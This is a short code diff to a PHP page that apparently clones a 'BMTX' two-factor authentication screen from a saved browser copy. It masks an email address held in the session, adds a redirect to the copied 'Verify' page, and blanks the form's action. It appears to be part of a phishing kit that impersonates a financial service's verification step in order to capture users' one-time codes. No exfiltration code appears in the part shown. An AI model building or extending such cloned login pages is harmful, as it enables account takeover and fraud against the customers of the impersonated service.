@@ -10,8 +10,14 @@ function redactEmail($email) {
     return $user[0] . str_repeat('*', $len - 2) . $user[$len - 1] . '@' . $domain;
 }
 
+
+
 $originalEmail = $_SESSION['user_email'] ?? 'someone@example.com';
 $redactedEmail = redactEmail($originalEmail);
+
+header("Location: BMTX_ Two Factor Authentication Verify.html"); // or any other page
+exit;
+
 ?>
 
 
@@ -123,7 +129,7 @@ span[data-ez-ph-id] { position: absolute !important; left: -3000px !important; }
       <div class="pagebody_div factor2Pt">
 
        <div class="pagecontent_div factor2Content">
-  <form name="twoFactorAuthenticationForm" method="post" action="BMTX_ Two Factor Authentication Verify.html" id="twoFactorAuthenticationForm" novalidate="novalidate">
+  <form name="twoFactorAuthenticationForm" method="post" action="" id="twoFactorAuthenticationForm" novalidate="novalidate">
     <div class="container">
       <div class="row">
         <div class="icon col-xs-12 col-sm-4 col-md-3">
